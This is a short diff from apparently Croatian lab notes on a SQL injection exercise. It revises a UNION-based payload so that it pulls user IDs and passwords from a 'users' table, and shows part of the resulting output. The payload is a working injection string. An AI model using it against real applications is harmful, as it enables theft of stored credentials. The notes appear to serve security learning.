@@ -40,7 +40,7 @@ naredba:
 			First name: 
 			Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
 	
-	4' OR '0'='0' UNION SELECT * FROM users WHERE '0'='0
+	4' OR '0'='0' UNION SELECT user_id, password FROM users WHERE '0'='0
 		rezultat:
 			ID: 4' OR '0'='0' UNION SELECT user_id, password FROM users WHERE '0'='0
 			First name: 4
